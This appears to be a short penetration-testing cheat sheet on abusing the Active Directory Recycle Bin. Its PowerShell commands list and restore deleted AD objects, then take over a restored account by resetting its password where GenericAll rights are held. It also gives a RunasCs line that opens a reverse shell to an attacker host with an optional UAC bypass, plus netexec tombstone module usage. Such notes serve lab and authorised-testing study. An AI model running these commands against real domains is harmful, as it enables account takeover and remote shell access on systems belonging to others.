This feature allows admins to recover deleted AD objects. 

```powershell
# Check if installed
Get-ADOptionalFeature 'Recycle Bin Feature'

# List deleted items
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent

# Recovery an item
Restore-ADObject -Identity <GUID>

Get-ADUser <name>
	# If we have GenericAll, we can compromise it via pass reset

# Compromise
Set-ADAccountPassword <name> -NewPassword (ConvertTo-SecureString 'YouGotPwn3d!xD' -AsPlainText -Force)

	# or
.\RunasCs.exe <user> <pass> powershell -r <LHOST>:<LPORT> [--bypass-uac]
```

nxc Alternative
```bash
# Query for deleted users
-M tombstone -o ACTION=query   # Make note of ID

# Restore deleted User
-M tombstone -o ACTION=restore ID=<ID> SCHEME=ldap
```